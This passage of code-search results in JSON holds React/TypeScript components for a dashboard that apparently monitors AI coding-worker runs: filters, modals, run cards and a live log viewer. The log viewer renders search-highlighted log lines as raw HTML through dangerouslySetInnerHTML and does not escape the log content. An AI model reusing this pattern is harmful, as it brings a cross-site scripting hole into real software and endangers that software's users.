{client.runCounts?.total || 0}\n      </td>\n      <td style={{ padding: '10px 12px', fontSize: '12px', color: 'var(--text-secondary)' }}>\n        {formatRelativeTime(client.last_seen_at)}\n      </td>\n    </tr>\n  );\n}\n\nexport default ClientCard;", "metadata": {"file": "ui/src/components/ui/ClientCard.tsx", "start_line": 201, "end_line": 238, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/ConnectionIndicator.tsx", "location": "ui/src/components/ui/ConnectionIndicator.tsx:1", "score": 0.0, "content": "interface ConnectionIndicatorProps {\n  connected: boolean;\n  reconnecting?: boolean;\n}\n\nexport function ConnectionIndicator({ connected, reconnecting }: ConnectionIndicatorProps) {\n  const status = connected ? 'connected' : reconnecting ? 'reconnecting' : 'disconnected';\n\n  const config = {\n    connected: { color: 'var(--accent-green)', icon: '\u25cf', text: 'Live' },\n    reconnecting: { color: 'var(--accent-yellow)', icon: '\u25cb', text: 'Reconnecting...' },\n    disconnected: { color: 'var(--accent-red)', icon: '\u25cb', text: 'Disconnected' },\n  };\n\n  const c = config[status];\n\n  return (\n    <span\n      style={{\n        display: 'inline-flex',\n        alignItems: 'center',\n        gap: '6px',\n        fontSize: '12px',\n        color: c.color,\n      }}\n      aria-label={`Connection status: ${c.text}`}\n    >\n      <span style={{ fontSize: '10px' }}>{c.icon}</span>\n      {c.text}\n    </span>\n  );\n}\n\nexport default ConnectionIndicator;", "metadata": {"file": "ui/src/components/ui/ConnectionIndicator.tsx", "start_line": 1, "end_line": 34, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/FilterBar.tsx", "location": "ui/src/components/ui/FilterBar.tsx:1", "score": 0.0, "content": "import { useState, useCallback, ReactNode } from 'react';\n\nexport interface FilterOption {\n  value: string;\n  label: string;\n  count?: number;\n}\n\ninterface FilterSelectProps {\n  label: string;\n  value: string;\n  options: FilterOption[];\n  onChange: (value: string) => void;\n  icon?: string;\n}\n\nexport function FilterSelect({ label, value, options, onChange, icon }: FilterSelectProps) {\n  return (\n    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>\n      <label\n        style={{\n          fontSize: '11px',\n          fontWeight: 500,\n          color: 'var(--text-muted)',\n          textTransform: 'uppercase',\n          letterSpacing: '0.5px',\n        }}\n      >\n        {label}\n      </label>\n      <div style={{ position: 'relative', display: 'flex', alignItems: 'center' }}>\n        {icon && (\n          <span\n            style={{\n              position: 'absolute',\n              left: '10px',\n              fontSize: '14px',\n              pointerEvents: 'none',\n            }}\n          >\n            {icon}\n          </span>\n        )}\n        <select\n          value={value}\n          onChange={(e) => onChange(e.target.value)}\n          style={{\n            appearance: 'none',\n            padding: icon ? '8px 32px 8px 32px' : '8px 32px 8px 12px',\n            fontSize: '13px',\n            background: 'var(--bg-tertiary)',\n            border: '1px solid var(--border-color)',\n            borderRadius: '6px',\n            color: 'var(--text-primary)',\n            cursor: 'pointer',\n            minWidth: '120px',\n          }}\n          aria-label={label}\n        >\n          {options.map((opt) => (\n            <option key={opt.value} value={opt.value}>\n              {opt.label}\n              {opt.count !== undefined ? ` (${opt.count})` : ''}\n            </option>\n          ))}\n        </select>\n        <span\n          style={{\n            position: 'absolute',\n            right: '10px',\n            pointerEvents: 'none',\n            fontSize: '10px',\n            color: 'var(--text-secondary)',\n          }}\n        >\n          \u25bc\n        </span>\n      </div>\n    </div>\n  );\n}\n\ninterface SearchInputProps {\n  value: string;\n  onChange: (value: string) => void;\n  placeholder?: string;\n  debounceMs?: number;\n}\n\nexport function SearchInput({\n  value,\n  onChange,\n  placeholder = 'Search...',\n  debounceMs = 300,\n}: SearchInputProps) {\n  const [localValue, setLocalValue] = useState(value);\n\n  const debouncedOnChange = useCallback(\n    debounce((val: string) => onChange(val), debounceMs),\n    [onChange, debounceMs]\n  );\n\n  return (\n    <div style={{ position: 'relative', flex: 1, minWidth: '200px', maxWidth: '300px' }}>\n      <span\n        style={{\n          position: 'absolute',\n          left: '12px',\n          top: '50%',\n          transform: 'translateY(-50%)',\n          fontSize: '14px',\n          color: 'var(--text-muted)',\n          pointerEvents: 'none',\n        }}\n      >\n        \ud83d\udd0d\n      </span>\n      <input\n        type=\"text\"\n        value={localValue}\n        onChange={(e) => {\n          setLocalValue(e.target.value);\n          debouncedOnChange(e.target.value);\n        }}\n        placeholder={placeholder}\n        style={{\n          width: '100%',\n          padding: '8px 12px 8px 36px',\n          fontSize: '13px',\n          background: 'var(--bg-tertiary)',\n          border: '1px solid var(--border-color)',\n          borderRadius: '6px',\n          color: 'var(--text-primary)',\n        }}\n        aria-label={placeholder}\n      />\n      {localValue && (\n        <button\n          onClick={() => {\n            setLocalValue('');\n            onChange('');\n          }}\n          style={{\n            position: 'absolute',\n            right: '8px',\n            top: '50%',\n            transform: 'translateY(-50%)',\n            background: 'none',\n            border: 'none',\n            color: 'var(--text-muted)',\n            cursor: 'pointer',\n            padding: '4px',\n            fontSize: '14px',\n          }}\n          aria-label=\"Clear search\"\n        >\n          \u00d7\n        </button>\n      )}\n    </div>\n  );\n}\n\ninterface FilterBarProps {\n  children: ReactNode;\n  onReset?: () => void;\n  hasActiveFilters?: boolean;\n}\n\nexport function FilterBar({ children, onReset, hasActiveFilters }: FilterBarProps) {\n  const [expanded, setExpanded] = useState(false);\n\n  return (\n    <div\n      style={{\n        background: 'var(--bg-secondary)',\n        border: '1px solid var(--border-color)',\n        borderRadius: '8px',\n        padding: '12px 16px',\n        marginBottom: '16px',\n      }}\n    >\n      {/* Mobile toggle */}\n      <div\n        className=\"filter-bar-toggle\"\n        onClick={() => setExpanded(!expanded)}\n        style={{\n          display: 'none', // Shown via media query in CSS\n          alignItems: 'center',\n          justifyContent: 'space-between',\n          cursor: 'pointer',\n          padding: '4px 0',\n        }}\n      >\n        <span style={{ fontSize: '14px', fontWeight: 500 }}>\n          Filters\n          {hasActiveFilters && (\n            <span\n              style={{\n                marginLeft: '8px',", "metadata": {"file": "ui/src/components/ui/FilterBar.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/FilterBar.tsx", "location": "ui/src/components/ui/FilterBar.tsx:201", "score": 0.0, "content": "                padding: '2px 6px',\n                fontSize: '11px',\n                background: 'var(--accent-blue)',\n                color: 'white',\n                borderRadius: '10px',\n              }}\n            >\n              Active\n            </span>\n          )}\n        </span>\n        <span style={{ fontSize: '12px' }}>{expanded ? '\u25b2' : '\u25bc'}</span>\n      </div>\n\n      {/* Filter content */}\n      <div\n        className=\"filter-bar-content\"\n        style={{\n          display: 'flex',\n          flexWrap: 'wrap',\n          gap: '12px',\n          alignItems: 'flex-end',\n        }}\n        data-expanded={expanded}\n      >\n        {children}\n        {hasActiveFilters && onReset && (\n          <button\n            onClick={onReset}\n            style={{\n              padding: '8px 12px',\n              fontSize: '12px',\n              background: 'none',\n              border: 'none',\n              color: 'var(--text-secondary)',\n              cursor: 'pointer',\n              textDecoration: 'underline',\n            }}\n          >\n            Reset filters\n          </button>\n        )}\n      </div>\n    </div>\n  );\n}\n\n// Debounce utility\nfunction debounce<T extends (...args: any[]) => any>(func: T, wait: number): T {\n  let timeout: NodeJS.Timeout;\n  return ((...args: Parameters<T>) => {\n    clearTimeout(timeout);\n    timeout = setTimeout(() => func(...args), wait);\n  }) as T;\n}\n\nexport default FilterBar;", "metadata": {"file": "ui/src/components/ui/FilterBar.tsx", "start_line": 201, "end_line": 257, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/index.ts", "location": "ui/src/components/ui/index.ts:1", "score": 0.0, "content": "export { StatusPill, type Status, type ConnectionStatus } from './StatusPill';\nexport { ConnectionIndicator } from './ConnectionIndicator';\nexport { ToastProvider, useToast } from './Toast';\nexport { Modal, ConfirmModal } from './Modal';\nexport { RunCard, RunRow, type Run } from './RunCard';\nexport { ClientCard, ClientRow, type Client } from './ClientCard';\nexport { ActionBar, ActionButton } from './ActionBar';\nexport { FilterBar, FilterSelect, SearchInput, type FilterOption } from './FilterBar';\nexport { LiveLogViewer, type LogEvent } from './LiveLogViewer';", "metadata": {"file": "ui/src/components/ui/index.ts", "start_line": 1, "end_line": 9, "language": "ts"}}, {"corpus": "code", "source": "ui/src/components/ui/LiveLogViewer.tsx", "location": "ui/src/components/ui/LiveLogViewer.tsx:1", "score": 0.0, "content": "import { useState, useRef, useEffect, useCallback, useMemo } from 'react';\n\nexport interface LogEvent {\n  id: number;\n  type: 'stdout' | 'stderr' | 'marker' | 'info' | 'error' | 'assist' | 'prompt_waiting' | 'prompt_resolved';\n  data: string;\n  timestamp: number;\n  step_id?: string;\n}\n\ninterface LiveLogViewerProps {\n  events: LogEvent[];\n  autoScroll?: boolean;\n  onAutoScrollChange?: (enabled: boolean) => void;\n  maxHeight?: string;\n  searchTerm?: string;\n}\n\nconst LINE_HEIGHT = 24;\nconst BUFFER_SIZE = 20;\n\n// Color mapping for event types\nconst typeColors: Record<string, string> = {\n  stdout: 'var(--text-primary)',\n  stderr: 'var(--accent-red)',\n  marker: 'var(--accent-purple)',\n  info: 'var(--accent-blue)',\n  error: 'var(--accent-red)',\n  assist: 'var(--accent-green)',\n  prompt_waiting: 'var(--accent-purple)',\n  prompt_resolved: 'var(--accent-green)',\n};\n\nexport function LiveLogViewer({\n  events,\n  autoScroll = true,\n  onAutoScrollChange,\n  maxHeight = '60vh',\n  searchTerm,\n}: LiveLogViewerProps) {\n  const containerRef = useRef<HTMLDivElement>(null);\n  const [scrollTop, setScrollTop] = useState(0);\n  const [containerHeight, setContainerHeight] = useState(0);\n  const [localAutoScroll, setLocalAutoScroll] = useState(autoScroll);\n  const [userToggledAutoScroll, setUserToggledAutoScroll] = useState(false);\n  const [copyFeedback, setCopyFeedback] = useState(false);\n\n  // Process events - collapse consecutive similar lines\n  const processedEvents = useMemo(() => {\n    const result: (LogEvent & { collapsed?: number; isError?: boolean })[] = [];\n    let lastLine = '';\n    let collapseCount = 0;\n\n    for (const event of events) {\n      // Detect errors\n      const isError = event.type === 'stderr' ||\n        event.type === 'error' ||\n        /error|exception|failed|fatal/i.test(event.data);\n\n      // Collapse repeated lines\n      if (event.data === lastLine && event.type === 'stdout') {\n        collapseCount++;\n        if (result.length > 0) {\n          result[result.length - 1].collapsed = collapseCount;\n        }\n        continue;\n      }\n\n      lastLine = event.data;\n      collapseCount = 1;\n      result.push({ ...event, isError });\n    }\n\n    return result;\n  }, [events]);\n\n  // Filter events by search term\n  const filteredEvents = useMemo(() => {\n    if (!searchTerm) return processedEvents;\n    const term = searchTerm.toLowerCase();\n    return processedEvents.filter(e => e.data.toLowerCase().includes(term));\n  }, [processedEvents, searchTerm]);\n\n  // Virtualization\n  const totalHeight = filteredEvents.length * LINE_HEIGHT;\n  const startIndex = Math.max(0, Math.floor(scrollTop / LINE_HEIGHT) - BUFFER_SIZE);\n  const endIndex = Math.min(\n    filteredEvents.length,\n    Math.ceil((scrollTop + containerHeight) / LINE_HEIGHT) + BUFFER_SIZE\n  );\n  const visibleEvents = filteredEvents.slice(startIndex, endIndex);\n  const offsetY = startIndex * LINE_HEIGHT;\n\n  // Handle scroll\n  const handleScroll = useCallback(() => {\n    if (!containerRef.current) return;\n    const { scrollTop, scrollHeight, clientHeight } = containerRef.current;\n    setScrollTop(scrollTop);\n\n    // Check if user scrolled up manually\n    const isAtBottom = scrollHeight - scrollTop - clientHeight < 50;\n\n    // Only auto-enable scroll if user hasn't manually disabled it\n    if (!isAtBottom && localAutoScroll && !userToggledAutoScroll) {\n      setLocalAutoScroll(false);\n      onAutoScrollChange?.(false);\n    }\n    // Don't automatically re-enable if user manually disabled it\n  }, [localAutoScroll, userToggledAutoScroll, onAutoScrollChange]);\n\n  // Update container height on resize\n  useEffect(() => {\n    const container = containerRef.current;\n    if (!container) return;\n\n    const resizeObserver = new ResizeObserver((entries) => {\n      for (const entry of entries) {\n        setContainerHeight(entry.contentRect.height);\n      }\n    });\n\n    resizeObserver.observe(container);\n    return () => resizeObserver.disconnect();\n  }, []);\n\n  // Auto-scroll to bottom when new events arrive\n  useEffect(() => {\n    if (localAutoScroll && containerRef.current) {\n      containerRef.current.scrollTop = containerRef.current.scrollHeight;\n    }\n  }, [filteredEvents.length, localAutoScroll]);\n\n  // Find error indices for \"jump to errors\"\n  const errorIndices = useMemo(() => {\n    return filteredEvents\n      .map((e, i) => e.isError ? i : -1)\n      .filter(i => i !== -1);\n  }, [filteredEvents]);\n\n  const jumpToError = (index: number) => {\n    if (containerRef.current && errorIndices[index] !== undefined) {\n      containerRef.current.scrollTop = errorIndices[index] * LINE_HEIGHT;\n      setLocalAutoScroll(false);\n      onAutoScrollChange?.(false);\n    }\n  };\n\n  const toggleAutoScroll = () => {\n    const newValue = !localAutoScroll;\n    setLocalAutoScroll(newValue);\n    setUserToggledAutoScroll(true);\n    onAutoScrollChange?.(newValue);\n    if (newValue && containerRef.current) {\n      containerRef.current.scrollTop = containerRef.current.scrollHeight;\n    }\n  };\n\n  // Copy log content to clipboard\n  const copyToClipboard = async () => {\n    const allText = filteredEvents\n      .map((event, i) => `${i + 1} ${event.data}`)\n      .join('\\n');\n\n    try {\n      await navigator.clipboard.writeText(allText);\n      setCopyFeedback(true);\n      setTimeout(() => setCopyFeedback(false), 2000);\n    } catch (err) {\n      console.error('Failed to copy:', err);\n    }\n  };\n\n  return (\n    <div\n      className=\"log-viewer\"\n      style={{\n        background: 'var(--bg-primary)',\n        border: '1px solid var(--border-color)',\n        borderRadius: '8px',\n        overflow: 'hidden',\n      }}\n    >\n      {/* Header */}\n      <div\n        style={{\n          display: 'flex',\n          alignItems: 'center',\n          justifyContent: 'space-between',\n          padding: '8px 12px',\n          background: 'var(--bg-secondary)',\n          borderBottom: '1px solid var(--border-color)',\n          gap: '8px',\n          flexWrap: 'wrap',\n        }}\n      >\n        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>\n          <span style={{ fontSize: '13px', fontWeight: 500 }}>Log Output</span>\n          <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>\n            {filteredEvents.length} lines\n          </span>", "metadata": {"file": "ui/src/components/ui/LiveLogViewer.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/LiveLogViewer.tsx", "location": "ui/src/components/ui/LiveLogViewer.tsx:201", "score": 0.0, "content": "        </div>\n\n        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>\n          {errorIndices.length > 0 && (\n            <button\n              onClick={() => jumpToError(0)}\n              style={{\n                padding: '4px 8px',\n                fontSize: '11px',\n                background: 'rgba(248, 81, 73, 0.15)',\n                border: 'none',\n                borderRadius: '4px',\n                color: 'var(--accent-red)',\n                cursor: 'pointer',\n              }}\n              aria-label={`Jump to errors (${errorIndices.length} found)`}\n            >\n              {errorIndices.length} errors\n            </button>\n          )}\n\n          <button\n            onClick={copyToClipboard}\n            style={{\n              padding: '4px 8px',\n              fontSize: '11px',\n              background: copyFeedback ? 'rgba(59, 185, 80, 0.15)' : 'var(--bg-tertiary)',\n              border: 'none',\n              borderRadius: '4px',\n              color: copyFeedback ? 'var(--accent-green)' : 'var(--text-secondary)',\n              cursor: 'pointer',\n              transition: 'all 0.3s ease',\n            }}\n            title=\"Copy all log output to clipboard\"\n            aria-label=\"Copy log output\"\n          >\n            {copyFeedback ? '\u2713 Copied' : '\ud83d\udccb Copy'}\n          </button>\n\n          <button\n            onClick={toggleAutoScroll}\n            style={{\n              padding: '4px 8px',\n              fontSize: '11px',\n              background: localAutoScroll ? 'rgba(59, 185, 80, 0.15)' : 'var(--bg-tertiary)',\n              border: 'none',\n              borderRadius: '4px',\n              color: localAutoScroll ? 'var(--accent-green)' : 'var(--text-secondary)',\n              cursor: 'pointer',\n            }}\n            aria-label={`Auto-scroll ${localAutoScroll ? 'enabled' : 'disabled'}`}\n            aria-pressed={localAutoScroll}\n          >\n            Auto-scroll: {localAutoScroll ? 'ON' : 'OFF'}\n          </button>\n        </div>\n      </div>\n\n      {/* Log content with virtualization */}\n      <div\n        ref={containerRef}\n        onScroll={handleScroll}\n        style={{\n          height: maxHeight,\n          maxHeight: maxHeight,\n          overflowY: 'auto',\n          overflowX: 'hidden',\n          position: 'relative',\n        }}\n      >\n        {/* Virtual scroll spacer */}\n        <div style={{ height: totalHeight, position: 'relative' }}>\n          <div\n            style={{\n              position: 'absolute',\n              top: offsetY,\n              left: 0,\n              right: 0,\n              fontFamily: \"'Monaco', 'Menlo', 'Ubuntu Mono', monospace\",\n              fontSize: '13px',\n              lineHeight: `${LINE_HEIGHT}px`,\n            }}\n          >\n            {visibleEvents.length === 0 ? (\n              <div\n                style={{\n                  padding: '24px',\n                  textAlign: 'center',\n                  color: 'var(--text-muted)',\n                  fontStyle: 'italic',\n                }}\n              >\n                {events.length === 0\n                  ? 'Waiting for output...'\n                  : 'No matching lines found'}\n              </div>\n            ) : (\n              visibleEvents.map((event, i) => (\n                <LogLine\n                  key={event.id}\n                  event={event}\n                  index={startIndex + i}\n                  searchTerm={searchTerm}\n                />\n              ))\n            )}\n          </div>\n        </div>\n      </div>\n    </div>\n  );\n}\n\ninterface LogLineProps {\n  event: LogEvent & { collapsed?: number; isError?: boolean };\n  index: number;\n  searchTerm?: string;\n}\n\nfunction LogLine({ event, index, searchTerm }: LogLineProps) {\n  const color = typeColors[event.type] || 'var(--text-primary)';\n  const isMarker = event.type === 'marker';\n  const isAssist = event.type === 'assist';\n\n  // Format marker content\n  let content = event.data;\n  if (isMarker) {\n    try {\n      const data = JSON.parse(event.data);\n      content = `\u25b6 ${data.event?.toUpperCase() || event.data}`;\n    } catch {\n      content = `\u25b6 ${event.data}`;\n    }\n  } else if (isAssist) {\n    try {\n      const data = JSON.parse(event.data);\n      content = `\\uD83D\\uDD17 Assist: ${data.url || event.data}`;\n    } catch {\n      content = `\\uD83D\\uDD17 ${event.data}`;\n    }\n  }\n\n  // Highlight search term\n  if (searchTerm && content.toLowerCase().includes(searchTerm.toLowerCase())) {\n    const parts = content.split(new RegExp(`(${escapeRegExp(searchTerm)})`, 'gi'));\n    content = parts.map((part) =>\n      part.toLowerCase() === searchTerm.toLowerCase()\n        ? `<mark style=\"background: rgba(210, 153, 34, 0.4); padding: 0 2px;\">${part}</mark>`\n        : part\n    ).join('');\n  }\n\n  return (\n    <div\n      style={{\n        display: 'flex',\n        padding: '0 12px',\n        height: LINE_HEIGHT,\n        alignItems: 'center',\n        color,\n        fontWeight: isMarker || isAssist ? 600 : 400,\n        background: event.isError ? 'rgba(248, 81, 73, 0.05)' : undefined,\n      }}\n    >\n      <span\n        style={{\n          width: '48px',\n          color: 'var(--text-muted)',\n          fontSize: '11px',\n          userSelect: 'none',\n          flexShrink: 0,\n        }}\n      >\n        {index + 1}\n      </span>\n      <span\n        style={{\n          whiteSpace: 'pre-wrap',\n          wordBreak: 'break-all',\n          flex: 1,\n        }}\n        dangerouslySetInnerHTML={searchTerm ? { __html: content } : undefined}\n      >\n        {!searchTerm ? content : undefined}\n      </span>\n      {event.collapsed && event.collapsed > 1 && (\n        <span\n          style={{\n            marginLeft: '8px',\n            padding: '2px 6px',\n            fontSize: '10px',\n            background: 'var(--bg-tertiary)',\n            borderRadius: '3px',\n            color: 'var(--text-muted)',\n          }}\n        >\n          \u00d7{event.collapsed}\n        </span>\n      )}\n    </div>", "metadata": {"file": "ui/src/components/ui/LiveLogViewer.tsx", "start_line": 201, "end_line": 400, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/LiveLogViewer.tsx", "location": "ui/src/components/ui/LiveLogViewer.tsx:401", "score": 0.0, "content": "  );\n}\n\nfunction escapeRegExp(string: string) {\n  return string.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');\n}\n\nexport default LiveLogViewer;", "metadata": {"file": "ui/src/components/ui/LiveLogViewer.tsx", "start_line": 401, "end_line": 408, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/Modal.tsx", "location": "ui/src/components/ui/Modal.tsx:1", "score": 0.0, "content": "import { ReactNode, useEffect } from 'react';\n\ninterface ModalProps {\n  open: boolean;\n  onClose: () => void;\n  title?: string;\n  children: ReactNode;\n  footer?: ReactNode;\n  size?: 'sm' | 'md' | 'lg';\n}\n\nconst sizeConfig = {\n  sm: '360px',\n  md: '480px',\n  lg: '640px',\n};\n\nexport function Modal({ open, onClose, title, children, footer, size = 'md' }: ModalProps) {\n  // Close on escape\n  useEffect(() => {\n    const handleEscape = (e: KeyboardEvent) => {\n      if (e.key === 'Escape' && open) {\n        onClose();\n      }\n    };\n    window.addEventListener('keydown', handleEscape);\n    return () => window.removeEventListener('keydown', handleEscape);\n  }, [open, onClose]);\n\n  // Prevent body scroll when open\n  useEffect(() => {\n    if (open) {\n      document.body.style.overflow = 'hidden';\n    } else {\n      document.body.style.overflow = '';\n    }\n    return () => {\n      document.body.style.overflow = '';\n    };\n  }, [open]);\n\n  if (!open) return null;\n\n  return (\n    <div\n      style={{\n        position: 'fixed',\n        inset: 0,\n        background: 'rgba(0, 0, 0, 0.6)',\n        display: 'flex',\n        alignItems: 'center',\n        justifyContent: 'center',\n        padding: '16px',\n        zIndex: 1001,\n        animation: 'fadeIn 0.2s ease',\n      }}\n      onClick={(e) => {\n        if (e.target === e.currentTarget) onClose();\n      }}\n      role=\"dialog\"\n      aria-modal=\"true\"\n      aria-labelledby={title ? 'modal-title' : undefined}\n    >\n      <div\n        style={{\n          width: '100%',\n          maxWidth: sizeConfig[size],\n          maxHeight: 'calc(100vh - 32px)',\n          background: 'var(--bg-secondary)',\n          border: '1px solid var(--border-color)',\n          borderRadius: '12px',\n          display: 'flex',\n          flexDirection: 'column',\n          animation: 'slideUp 0.2s ease',\n          overflow: 'hidden',\n        }}\n      >\n        {title && (\n          <div\n            style={{\n              padding: '16px 20px',\n              borderBottom: '1px solid var(--border-color)',\n              display: 'flex',\n              alignItems: 'center',\n              justifyContent: 'space-between',\n            }}\n          >\n            <h2 id=\"modal-title\" style={{ fontSize: '18px', fontWeight: 600, margin: 0 }}>\n              {title}\n            </h2>\n            <button\n              onClick={onClose}\n              style={{\n                background: 'none',\n                border: 'none',\n                color: 'var(--text-secondary)',\n                fontSize: '24px',\n                cursor: 'pointer',\n                padding: '4px',\n                lineHeight: 1,\n              }}\n              aria-label=\"Close modal\"\n            >\n              \u00d7\n            </button>\n          </div>\n        )}\n\n        <div style={{ padding: '20px', flex: 1, overflowY: 'auto' }}>\n          {children}\n        </div>\n\n        {footer && (\n          <div\n            style={{\n              padding: '16px 20px',\n              borderTop: '1px solid var(--border-color)',\n              display: 'flex',\n              gap: '12px',\n              justifyContent: 'flex-end',\n            }}\n          >\n            {footer}\n          </div>\n        )}\n      </div>\n    </div>\n  );\n}\n\n// Confirm dialog helper\ninterface ConfirmModalProps {\n  open: boolean;\n  onClose: () => void;\n  onConfirm: () => void;\n  title: string;\n  message: string;\n  confirmText?: string;\n  cancelText?: string;\n  danger?: boolean;\n  loading?: boolean;\n}\n\nexport function ConfirmModal({\n  open,\n  onClose,\n  onConfirm,\n  title,\n  message,\n  confirmText = 'Confirm',\n  cancelText = 'Cancel',\n  danger = false,\n  loading = false,\n}: ConfirmModalProps) {\n  return (\n    <Modal\n      open={open}\n      onClose={onClose}\n      title={title}\n      size=\"sm\"\n      footer={\n        <>\n          <button className=\"btn\" onClick={onClose} disabled={loading}>\n            {cancelText}\n          </button>\n          <button\n            className={`btn ${danger ? 'btn-danger' : 'btn-primary'}`}\n            onClick={onConfirm}\n            disabled={loading}\n          >\n            {loading ? 'Please wait...' : confirmText}\n          </button>\n        </>\n      }\n    >\n      <p style={{ color: 'var(--text-secondary)', margin: 0 }}>{message}</p>\n    </Modal>\n  );\n}\n\nexport default Modal;", "metadata": {"file": "ui/src/components/ui/Modal.tsx", "start_line": 1, "end_line": 181, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/RunCard.tsx", "location": "ui/src/components/ui/RunCard.tsx:1", "score": 0.0, "content": "import { useNavigate } from 'react-router-dom';\nimport { StatusPill, Status } from './StatusPill';\n\nexport interface Run {\n  id: string;\n  status: Status;\n  label?: string | null;\n  command?: string | null;\n  repo_name?: string | null;\n  repo_path?: string | null;\n  client_id?: string | null;\n  client_name?: string | null;\n  client_status?: string | null;\n  created_at: number;\n  started_at?: number | null;\n  finished_at?: number | null;\n  waiting_approval?: number;\n  artifact_count?: number;\n  hasAssist?: boolean;\n  duration?: number | null;\n  worker_type?: string | null;\n  metadata?: {\n    model?: string;\n    workerType?: string;\n  } | null;\n}\n\ninterface RunCardProps {\n  run: Run;\n  compact?: boolean;\n  showClient?: boolean;\n  onClick?: () => void;\n}\n\nfunction formatRelativeTime(timestamp: number): string {\n  const now = Math.floor(Date.now() / 1000);\n  const diff = now - timestamp;\n\n  if (diff < 60) return 'just now';\n  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;\n  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;\n  return `${Math.floor(diff / 86400)}d ago`;\n}\n\nfunction formatDuration(seconds: number): string {\n  if (seconds < 60) return `${seconds}s`;\n  if (seconds < 3600) return `${Math.floor(seconds / 60)}m ${seconds % 60}s`;\n  const hours = Math.floor(seconds / 3600);\n  const mins = Math.floor((seconds % 3600) / 60);\n  return `${hours}h ${mins}m`;\n}\n\nfunction getWorkerIcon(workerType: string | null): string {\n  const icons: Record<string, string> = {\n    claude: '',\n    ollama: '',\n    'ollama-launch': '',\n    codex: '',\n    gemini: '',\n    rev: ''\n  };\n  return icons[workerType || 'claude'] || '';\n}\n\nfunction getWorkerColor(workerType: string | null): string {\n  const colors: Record<string, string> = {\n    claude: '#D97706', // amber\n    ollama: '#059669', // emerald\n    'ollama-launch': '#9333EA', // purple\n    codex: '#0891B2', // cyan\n    gemini: '#7C3AED', // violet\n    rev: '#DC2626' // red\n  };\n  return colors[workerType || 'claude'] || '#6B7280';\n}\n\nexport function RunCard({ run, compact = false, showClient = true, onClick }: RunCardProps) {\n  const navigate = useNavigate();\n  const handleClick = onClick || (() => navigate(`/runs/${run.id}`));\n\n  const displayTitle = run.label || run.command?.slice(0, 60) || `Run ${run.id}`;\n  const needsApproval = run.waiting_approval === 1;\n  const workerType = run.worker_type || run.metadata?.workerType || 'claude';\n  const workerIcon = getWorkerIcon(workerType);\n  const workerColor = getWorkerColor(workerType);\n  // Format worker display name: capitalize first letter, handle hyphens\n  const workerDisplayName = workerType\n    .split('-')\n    .map(word => word.charAt(0).toUpperCase() + word.slice(1))\n    .join(' ');\n\n  return (\n    <div\n      className=\"run-card\"\n      onClick={handleClick}\n      style={{\n        display: 'flex',\n        flexDirection: compact ? 'row' : 'column',\n        alignItems: compact ? 'center' : 'flex-start',\n        gap: compact ? '12px' : '8px',\n        padding: compact ? '10px 12px' : '14px 16px',\n        background: 'var(--bg-secondary)',\n        border: '1px solid var(--border-color)',\n        borderRadius: '8px',\n        cursor: 'pointer',\n        transition: 'all 0.15s ease',\n      }}\n      onMouseEnter={(e) => {\n        e.currentTarget.style.borderColor = 'var(--accent-blue)';\n        e.currentTarget.style.background = 'var(--bg-tertiary)';\n      }}\n      onMouseLeave={(e) => {\n        e.currentTarget.style.borderColor = 'var(--border-color)';\n        e.currentTarget.style.background = 'var(--bg-secondary)';\n      }}\n      role=\"button\"\n      tabIndex={0}\n      onKeyDown={(e) => {\n        if (e.key === 'Enter' || e.key === ' ') {\n          e.preventDefault();\n          handleClick();\n        }\n      }}\n      aria-label={`Run ${run.id}, status: ${run.status}`}\n    >\n      {/* Main info */}\n      <div style={{ flex: 1, minWidth: 0 }}>\n        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: compact ? 0 : '4px' }}>\n          <span\n            style={{\n              fontFamily: 'monospace',\n              fontSize: '14px',\n              fontWeight: 600,\n              color: 'var(--accent-blue)',\n            }}\n          >\n            {run.id}\n          </span>\n          <StatusPill status={run.status} size=\"sm\" />\n          <span\n            style={{\n              padding: '2px 6px',\n              fontSize: '11px',\n              fontWeight: 600,\n              background: `${workerColor}20`,\n              color: workerColor,\n              borderRadius: '4px',\n              display: 'flex',\n              alignItems: 'center',\n              gap: '4px',\n            }}\n          >\n            {workerIcon}\n            {workerDisplayName}\n          </span>\n          {needsApproval && (\n            <span\n              style={{\n                padding: '2px 6px',\n                fontSize: '10px',\n                fontWeight: 600,\n                background: 'var(--accent-purple)',\n                color: 'white',\n                borderRadius: '4px',\n              }}\n            >\n              NEEDS APPROVAL\n            </span>\n          )}\n        </div>\n\n        {!compact && (\n          <>\n            <div\n              style={{\n                fontSize: '14px',\n                color: 'var(--text-primary)',\n                marginBottom: '6px',\n                overflow: 'hidden',\n                textOverflow: 'ellipsis',\n                whiteSpace: 'nowrap',\n              }}\n            >\n              {displayTitle}\n            </div>\n\n            <div\n              style={{\n                fontSize: '12px',\n                color: 'var(--text-secondary)',\n                display: 'flex',\n                flexWrap: 'wrap',\n                gap: '8px',\n                alignItems: 'center',\n              }}\n            >\n              {showClient && run.client_name && (\n                <span style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>\n                  <span style={{ fontSize: '10px' }}>\\uD83D\\uDCBB</span>\n                  {run.client_name}", "metadata": {"file": "ui/src/components/ui/RunCard.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/RunCard.tsx", "location": "ui/src/components/ui/RunCard.tsx:201", "score": 0.0, "content": "                </span>\n              )}\n              {run.repo_name && (\n                <span style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>\n                  <span style={{ fontSize: '10px' }}>\\uD83D\\uDCC1</span>\n                  {run.repo_name}\n                </span>\n              )}\n              <span>{formatRelativeTime(run.created_at)}</span>\n              {run.duration && run.status === 'running' && (\n                <span 